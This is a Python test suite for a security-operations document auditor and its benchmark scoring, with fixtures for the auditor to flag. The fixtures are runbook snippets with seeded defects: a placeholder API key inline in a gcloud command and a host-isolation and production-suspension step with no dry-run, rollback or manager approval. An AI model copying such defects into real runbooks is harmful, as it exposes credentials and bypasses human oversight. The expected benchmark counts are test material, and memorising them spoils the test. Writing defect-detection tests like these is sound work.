# ---------------------------------------------------------------------------
# Cycle 27 (Horizon H28): Master Night 1 + Night 2 Cross-Horizon Synthesis,
# End-to-End Composite Playbook & Postmortem Readiness Auditor & BENCH-14
# ---------------------------------------------------------------------------


class TestCycle27MasterCrossHorizonSynthesisAndBenchmark:
  """Unit tests for Horizon H28: Master SecOps Document Readiness & Cross-Pillar
  Synthesis Auditor (`synthesize_master_secops_doc_readiness`,
  `audit_master_secops_doc_readiness_in_doc`), `BENCH-14-MASTER-COMPOSITE-SECOPS-SYNTHESIS`,
  `SKILLRL-08-MASTER-CROSS-PILLAR-READINESS-GATE`, and `generate_master_evolution_synthesis_report`."""

  def test_synthesize_master_secops_doc_readiness_detects_all_five_pillar_defects(
      self,
  ) -> None:
    """1. Verifies that a composite SecOps postmortem/runbook with seeded defects
    across all 5 pillars (`YL2`/Entity Graph `$g.graph`, SOAR/Siemplify/Spanner
    `/span/prod/` + secret hygiene, MITRE/GTI attribution mismatch, TDO/timeline gap,
    and WikiSkill/RRSI readiness gap) produces `release_gate_verdict == 'BLOCKED_CRITICAL_DEFECTS'`,
    populates all 5 `pillar_breakdown` entries, and generates non-overlapping
    `merged_annotations`."""
    from manager.tools.docs_review_tools import (
        H28_CAPABILITY_PILLAR_CATALOG,
        synthesize_master_secops_doc_readiness,
    )

    composite_doc = (
        "# Composite SecOps Incident Postmortem & Containment Runbook\n\n"
        "## Pillar 1: Chronicle SIEM YARA-L 2.0 (YL2) & Entity Graph\n"
        'YL2 Clause: `$g.graph.metadata.entity_type = "ASSET" and $g.graph.entity.hostname = "wins-d19" and outcome: $risk_score = count($e.metadata.id) + count($g.graph.entity.hostname)`\n\n'
        "## Pillar 2: SOAR Case Endpoint & Spanner Path\n"
        "Endpoint: POST https://us-chronicle.googleapis.com/v1alpha/projects/secops-demo-env/locations/us/instances/a13f6726-efed-452e-9008-8fe0d3cb0f75/cases with Spanner ledger path /span/prod/secops-case-ledger:cases_db\n\n"
        "## Pillar 3: MITRE & GTI Threat Attribution\n"
        "Attribution: Threat actor APT29 (Midnight Blizzard / UNC2452) deployed LockBit 3.0 ransomware via Carbanak POS backdoor on host wins-d19.\n\n"
        "## Pillar 4: Incident Timeline & TDO Coverage\n"
        "Timeline Inversion: Exfiltration (01:15 UTC) recorded prior to Initial Access (02:30 UTC) with TDO Coverage Gap: no Chronicle YARA-L 2.0 detection rule bound.\n\n"
        "## Pillar 5: WikiSkill RRSI & SkillRL Automation\n"
        "Containment: Execute immediate host isolation and production project suspension on wins-d19 without dry-run, rollback plan, or SOC Manager approval.\n"
        'CLI: `gcloud logging read "logName:projects/$PROJECT_ID/logs/cloudaudit.googleapis.com" --api-key="AIzaSyD9f8e7d6c5b4a3_HARDCODED_INLINE_SECRET"`\n'
    )

    res = synthesize_master_secops_doc_readiness(
        composite_doc, doc_title="INC-2026-MASTER-POSTMORTEM"
    )
    assert res["status"] == "success"
    assert res["release_gate_verdict"] == "BLOCKED_CRITICAL_DEFECTS"
    assert res["master_readiness_score"] < 50.0
    assert len(res["pillar_breakdown"]) == 5
    for pid in H28_CAPABILITY_PILLAR_CATALOG:
      assert pid in res["pillar_breakdown"]
      assert res["pillar_breakdown"][pid]["defect_count"] >= 1
      assert res["pillar_breakdown"][pid]["status"] == "FAIL"
      assert len(res["pillar_breakdown"][pid]["remediation_diffs"]) >= 1

    annotations = res["merged_annotations"]
    assert len(annotations) >= 6
    # Verify strict non-overlap of UTF-16 spans
    for i in range(1, len(annotations)):
      assert int(annotations[i - 1]["end_index"]) <= int(
          annotations[i]["start_index"]
      )
    assert (
        "[MASTER SECOPS DOCUMENT READINESS & CROSS-PILLAR SYNTHESIS GATE (H28)]"
        in res["markdown_executive_signoff_banner"]
    )

  def test_synthesize_master_secops_doc_readiness_clean_doc_and_standard_yara_exclusion(
      self,
  ) -> None:
    """2. Verifies that a fully remediated runbook containing valid Chronicle
    YARA-L 2.0 (`YL2`) with `$g.graph.entity.metadata.entity_type`, valid Siemplify
    `/api/1p/external/v1/cases` endpoints, `/span/global/` Spanner paths, and a
    standard file/payload YARA rule (`strings:` / `uint16(0) == 0x5A4D`) achieves
    `release_gate_verdict == 'APPROVED_FOR_SOC_EXECUTION'`, `0` critical/high
    findings, and `standard_yara_blocks_ignored_count == 1`."""
    from manager.tools.docs_review_tools import synthesize_master_secops_doc_readiness

    clean_doc = (
        "# Remediated SecOps Containment Runbook & Postmortem\n\n"
        "## 1. Verified Siemplify SOAR & Spanner Endpoint\n"
        "Active case endpoint: POST https://ytvgh.siemplify-soar.com:443/api/1p/external/v1/cases "
        "backed by Spanner path `/span/global/secops-case-ledger:cases_db`.\n\n"
        "## 2. Verified Chronicle SIEM YARA-L 2.0 Entity Graph Join\n"
        'Joined context: `$g.graph.entity.metadata.entity_type = "ASSET"` and `$e.principal.hostname = $g.graph.entity.hostname`.\n\n'
        "## 3. Standard File/Payload YARA Binary Signature (Negative Control)\n"
        "```yara\n"
        "rule standard_yara_pe_binary_check {\n"
        "  meta:\n"
        '    description = "Standard file/payload YARA rule matching MZ header"\n'
        "  strings:\n"
        '    $mz_str = "This program cannot be run in DOS mode"\n'
        "  condition:\n"
        "    uint16(0) == 0x5A4D and any of them\n"
        "}\n"
        "```\n"
    )

    res = synthesize_master_secops_doc_readiness(
        clean_doc, doc_title="Clean SecOps Runbook"
    )
    assert res["status"] == "success"
    assert res["release_gate_verdict"] == "APPROVED_FOR_SOC_EXECUTION"
    assert res["master_readiness_score"] == 100.0
    assert res["total_defect_count"] == 0
    assert res["critical_defect_count"] == 0
    assert res["high_defect_count"] == 0
    assert res["standard_yara_blocks_ignored_count"] == 1
    assert res["merged_annotations"] == []

  def test_audit_master_secops_doc_readiness_in_doc_end_to_end_mocked(
      self, monkeypatch
  ) -> None:
    """3. Mocks `read_google_doc`, `highlight_doc_passages`,
    `create_anchored_doc_comment`, and `insert_executive_summary_banner` to verify
    in-place Google Doc annotation and executive sign-off banner insertion."""
    import manager.tools.docs_review_tools as drt

    sample_text = (
        "# Composite Incident Runbook\n"
        "Attribution: Threat actor APT29 (Midnight Blizzard / UNC2452) deployed LockBit 3.0 ransomware via Carbanak POS backdoor on host wins-d19.\n"
        "Containment: Execute immediate host isolation and production project suspension on wins-d19 without dry-run, rollback plan, or SOC Manager approval.\n"
        'CLI: `gcloud logging read "logName:projects/$PROJECT_ID/logs/cloudaudit.googleapis.com" --api-key="AIzaSyD9f8e7d6c5b4a3_HARDCODED_INLINE_SECRET"`\n'
        "SOAR Endpoint: POST https://us-chronicle.googleapis.com/v1alpha/projects/secops-demo-env/locations/us/instances/a13f6726-efed-452e-9008-8fe0d3cb0f75/cases with Spanner ledger path /span/prod/secops-case-ledger:cases_db\n"
        'YL2: `$g.graph.metadata.entity_type = "ASSET" and $g.graph.entity.hostname = "wins-d19" and outcome: $risk_score = count($e.metadata.id) + count($g.graph.entity.hostname)`\n'
    )

    calls: dict[str, int] = {
        "read": 0,
        "highlight": 0,
        "comment": 0,
        "banner": 0,
    }

    def _mock_read(doc_id: str, **kwargs):
      calls["read"] += 1
      return {
          "status": "success",
          "document_id": doc_id,
          "title": "Mocked SecOps Composite Doc",
          "content": sample_text,
      }

    def _mock_highlight(doc_id: str, passages, color_hex: str = "#FFF2CC", **kwargs):
      calls["highlight"] += 1
      return {
          "status": "success",
          "doc_id": doc_id,
          "highlights_applied": len(passages),
      }

    def _mock_comment(doc_id: str, anchor_text: str, comment_text: str, **kwargs):
      calls["comment"] += 1
      return {
          "status": "success",
          "doc_id": doc_id,
          "comment_id": f"mock-c-{calls['comment']}",
          "anchor_text": anchor_text,
          "comment_text": comment_text,
      }

    def _mock_banner(doc_id: str, banner_text: str, **kwargs):
      calls["banner"] += 1
      return {
          "status": "success",
          "doc_id": doc_id,
          "banner_inserted": True,
          "inserted_chars": len(banner_text),
      }

    monkeypatch.setattr(drt, "read_google_doc", _mock_read)
    monkeypatch.setattr(drt, "highlight_doc_passages", _mock_highlight)
    monkeypatch.setattr(drt, "create_anchored_doc_comment", _mock_comment)
    monkeypatch.setattr(drt, "insert_executive_summary_banner", _mock_banner)

    res = drt.audit_master_secops_doc_readiness_in_doc(
        doc_id="1xWqRXooknTaEUVKyjjWYE1tHsRxES6B86y8cDf1csEE",
        apply_highlights=True,
        create_comments=True,
        prepend_executive_banner=True,
    )
    assert res["status"] == "success"
    assert res["release_gate_verdict"] == "BLOCKED_CRITICAL_DEFECTS"
    assert calls["read"] == 1
    assert calls["highlight"] == 1
    assert calls["comment"] == 5
    assert calls["banner"] == 1
    assert res["highlights_applied"] == 5
    assert res["comments_created"] == 5
    assert res["executive_banner_inserted"] is True

  def test_bench_14_master_composite_secops_synthesis_perfect_f1(self) -> None:
    """4. Verifies `BENCH-14-MASTER-COMPOSITE-SECOPS-SYNTHESIS` achieves `TP == 5`,
    `FP == 0`, `FN == 0`, `TN == 2`, `precision == 1.0`, `recall == 1.0`, `f1 == 1.0`,
    and full suite `evaluate_verification_benchmark_suite(include_extended_night2=True)`
    achieves `14` scenarios, `73` seeded defects, `29` negative controls, and
    `micro_f1 == 1.0`."""
    from manager.tools.docs_review_tools import (
        evaluate_benchmark_scenario,
        evaluate_verification_benchmark_suite,
    )

    b14 = evaluate_benchmark_scenario(
        "BENCH-14-MASTER-COMPOSITE-SECOPS-SYNTHESIS"
    )
    assert b14["status"] == "success"
    assert b14["TP"] == 5
    assert b14["FP"] == 0
    assert b14["FN"] == 0
    assert b14["TN"] == 2
    assert b14["precision"] == 1.0
    assert b14["recall"] == 1.0
    assert b14["f1"] == 1.0
    assert b14["pass2_idempotent"] is True

    suite = evaluate_verification_benchmark_suite(include_extended_night2=True)
    assert suite["status"] == "success"
    assert suite["scenario_count"] == 14
    assert suite["total_seeded_defects"] == 73
    assert suite["TP"] == 73
    assert suite["FP"] == 0
    assert suite["FN"] == 0
    assert suite["total_negative_controls"] == 29
    assert suite["TN"] == 29
    assert suite["micro_precision"] == 1.0
    assert suite["micro_recall"] == 1.0
    assert suite["micro_f1"] == 1.0
    assert suite["pass2_idempotency_rate"] == 1.0
    assert suite["google_drive_write_calls"] == 0

  def test_generate_skillrl_failure_distillation_matrix_includes_h28(
      self,
  ) -> None:
    """5. Verifies `SKILLRL-08-MASTER-CROSS-PILLAR-READINESS-GATE` is present
    (`8` total rules across `H25`..`H28`)."""
    from manager.tools.docs_review_tools import (
        generate_skillrl_failure_distillation_matrix,
    )

    matrix = generate_skillrl_failure_distillation_matrix(
        include_h26_entity_graph=True,
        include_h27_soar_actuation=True,
        include_h28_master_synthesis=True,
    )
    assert matrix["status"] == "success"
    assert matrix["rule_count"] == 8
    assert matrix["family_count"] == 8
    assert matrix["horizons_covered"] == ["H25", "H26", "H27", "H28"]
    assert "SKILLRL-08-MASTER-CROSS-PILLAR-READINESS-GATE" in matrix["rule_ids"]
    h28_rule = matrix["rules_by_id"][
        "SKILLRL-08-MASTER-CROSS-PILLAR-READINESS-GATE"
    ]
    assert h28_rule["horizon_id"] == "H28"
    assert len(h28_rule["defect_classes_covered"]) == 5

  def test_generate_master_evolution_synthesis_report_completeness(
      self,
  ) -> None:
    """6. Verifies `generate_master_evolution_synthesis_report()` returns
    structured telemetry for all 28 horizons (`H1`-`H28`), 5 capability pillars,
    14 benchmark scenarios, and 8 `SkillRL` rules."""
    from manager.tools.docs_review_tools import (
        generate_master_evolution_synthesis_report,
    )

    report = generate_master_evolution_synthesis_report()
    assert report["status"] == "success"
    assert report["total_cycles_completed"] == 27
    assert report["total_horizons_completed"] == 28
    assert len(report["horizons"]) == 28
    assert report["horizon_ids"][0] == "H1"
    assert report["horizon_ids"][-1] == "H28"
    assert report["capability_pillar_count"] == 5
    assert len(report["capability_pillars"]) == 5
    assert report["scenario_count"] == 14
    assert report["total_seeded_defects"] == 73
    assert report["total_negative_controls"] == 29
    assert report["micro_precision"] == 1.0
    assert report["micro_recall"] == 1.0
    assert report["micro_f1"] == 1.0
    assert report["skillrl_rule_count"] == 8

  def test_verify_and_annotate_google_doc_includes_master_readiness_summary(
      self,
  ) -> None:
    """7. Verifies `verify_and_annotate_google_doc` surfaces `master_readiness_audit`
    when invoked on a SecOps runbook."""
    from manager.tools.docs_review_tools import verify_and_annotate_google_doc

    doc_text = (
        "# SecOps Postmortem\n"
        "Attribution: Threat actor APT29 (Midnight Blizzard / UNC2452) deployed LockBit 3.0 ransomware via Carbanak POS backdoor.\n"
        "SOAR: POST https://us-chronicle.googleapis.com/v1alpha/projects/secops-demo-env/locations/us/instances/a13f6726-efed-452e-9008-8fe0d3cb0f75/cases with Spanner ledger path /span/prod/secops-case-ledger:cases_db\n"
    )
    res = verify_and_annotate_google_doc(
        doc_text=doc_text,
        include_master_readiness_audit=True,
    )
    assert res["status"] == "success"
    assert "H28" in res["horizons_executed"]
    assert "master_readiness_audit" in res
    assert (
        res["master_readiness_audit"]["release_gate_verdict"]
        == "BLOCKED_CRITICAL_DEFECTS"
    )
    assert res["total_defect_count"] >= 2

  def test_h28_adk_tool_declarations_and_simulator_in_doc_audit(self) -> None:
    """8. Verifies ADK `FunctionTool` declarations for `synthesize_master_secops_doc_readiness`,
    `audit_master_secops_doc_readiness_in_doc`, and `generate_master_evolution_synthesis_report`,
    plus end-to-end execution against `LocalGoogleDocsSimulator`."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        audit_master_secops_doc_readiness_in_doc,
        clear_doc_index_cache,
    )
    from manager.tools.tools import (
        audit_master_secops_doc_readiness_in_doc as tool_audit_fn,
        generate_master_evolution_synthesis_report as tool_report_fn,
        synthesize_master_secops_doc_readiness as tool_syn_fn,
    )

    for fn, expected_name in [
        (tool_syn_fn, "synthesize_master_secops_doc_readiness"),
        (tool_audit_fn, "audit_master_secops_doc_readiness_in_doc"),
        (tool_report_fn, "generate_master_evolution_synthesis_report"),
    ]:
      ft = FunctionTool(fn)
      decl = ft._get_declaration()
      assert decl is not None
      assert decl.name == expected_name

    bench14 = next(
        sc
        for sc in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if sc["scenario_id"] == "BENCH-14-MASTER-COMPOSITE-SECOPS-SYNTHESIS"
    )
    sim = LocalGoogleDocsSimulator()
    clear_doc_index_cache()
    sim.create_or_reset_doc(
        "sim-doc-h28",
        bench14["title"],
        bench14["markdown_content"],
        simulate_drive_markdown_import=True,
    )
    audit_res = audit_master_secops_doc_readiness_in_doc(
        doc_id="sim-doc-h28",
        apply_highlights=True,
        create_comments=True,
        prepend_executive_banner=True,
        docs_client_override=sim,
    )
    assert audit_res["status"] == "success"
    assert audit_res["release_gate_verdict"] == "BLOCKED_CRITICAL_DEFECTS"
    assert audit_res["total_defect_count"] == 5
    assert audit_res["standard_yara_blocks_ignored_count"] == 1
    assert audit_res["highlights_applied"] == 5
    assert audit_res["comments_created"] == 5
    assert audit_res["executive_banner_inserted"] is True




